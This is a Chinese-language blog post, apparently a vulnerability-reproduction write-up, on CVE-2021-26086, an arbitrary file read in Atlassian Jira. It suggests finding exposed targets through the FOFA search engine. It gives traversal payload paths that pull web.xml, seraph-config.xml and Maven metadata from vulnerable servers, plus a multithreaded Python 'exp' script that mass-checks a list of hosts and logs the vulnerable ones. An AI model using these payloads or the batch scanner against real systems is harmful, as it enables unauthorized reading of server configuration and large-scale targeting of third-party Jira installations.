<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [gylq.gitee.io](https://gylq.gitee.io/time/posts/1.html)

> Jira 任意文件读取泄漏复现（CVE-2021-26086）漏洞通报：https://www.seebug.org/vuldb/ssvid-99336 影响版本 version < 8.5.148.6.......

Jira 任意文件读取复现（CVE-2021-26086）
-----------------------------

2021-11-25 | [漏洞复现](https://gylq.gitee.io/time/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/) | [](https://gylq.gitee.io/time/posts/1.html#comments)|

| 645

**漏洞通报：[https://www.seebug.org/vuldb/ssvid-99336](https://www.seebug.org/vuldb/ssvid-99336)**

[](#影响版本 "影响版本")影响版本
--------------------

version < 8.5.14  
8.6.0 ≤ version < 8.13.6  
8.14.0 ≤ version < 8.16.1

此漏洞 CVE 编号和上面的 Confluence 信息泄漏漏洞编号连着，且利用方式类似，jira 和 confluence 是一家公司的产品，里面有很多代码规范相似。

JIRA 是 Atlassian 公司出品的项目与事务跟踪工具，被广泛应用于缺陷跟踪、客户服务、需求收集、流程审批、任务跟踪、项目跟踪和敏捷管理等工作领域。

JIRA 中配置灵活、功能全面、部署简单、扩展丰富，其超过 150 项特性得到了全球 115 个国家超过 19,000 家客户的认可。

1、直接搜 fofa 尝试找找案例

> [![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20211113212703526.png)](https://gitee.com/gylq/cloudimages/raw/master/img/image-20211113212703526.png)

2、具体 POC 如下，来源 [CVE-2021-26086](https://github.com/ColdFusionX/CVE-2021-26086)

```
/s/cfx/_/;/WEB-INF/web.xml
/s/cfx/_/;/WEB-INF/decorators.xml
/s/cfx/_/;/WEB-INF/classes/seraph-config.xml
/s/cfx/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties
/s/cfx/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.xml
/s/cfx/_/;/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
/s/cfx/_/;/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.properties
```

3、复现结果展示

> [![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20211113213355402.png)](https://gitee.com/gylq/cloudimages/raw/master/img/image-20211113213355402.png)

4、**多线程批量检测漏洞 exp by 孤桜懶契**

> [![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20211113220149713.png)](https://gitee.com/gylq/cloudimages/raw/master/img/image-20211113220149713.png)

```
# coding=utf-8
import requests
import base64
import re
import sys
import os
import json
import threading

banner = '''

                                                                                                                                                
                   version < 8.5.14
                    8.6.0 ≤ version < 8.13.6
                    8.14.0 ≤ version < 8.16.1

                      python by 开勒普 孤桜懶契

              usage: python exp.py 
                                                                                                                                                                                         
'''
print(banner)


def get_version(url):
    url_requests = url + "/s/cfx/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.xml"
    res=requests.get(url=url_requests)
    if res.status_code == 200:
        result = re.findall('version-number\" content="(.*?)\">',res.text)
        print("【*】 {} 存在漏洞--读取版本".format(url_requests),result)
        with open("Jiraresult.txt", "a+") as a:
            a.write("【*】 {} 存在漏洞--读取版本号： {} \n".format(url_requests,result))


if __name__ == "__main__":
    with open("Jira.txt", "r") as f:
        Jira = f.read().split("\n")
        i = 0
        print(len(Jira))
        while True:
            if i < len(Jira) and threading.active_count() < 50:
                t = threading.Thread(target=get_version, args=(Jira[i],))
                t.start()
                i += 1
                print(i, "/", len(Jira))
            if i == len(Jira) and threading.active_count() == 1:
                print("finish")
                break
```

附上一小部分检测截图

> [![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20211113220242598.png)](https://gitee.com/gylq/cloudimages/raw/master/img/image-20211113220242598.png)

------------------- 本文结束 感谢您的阅读 -------------------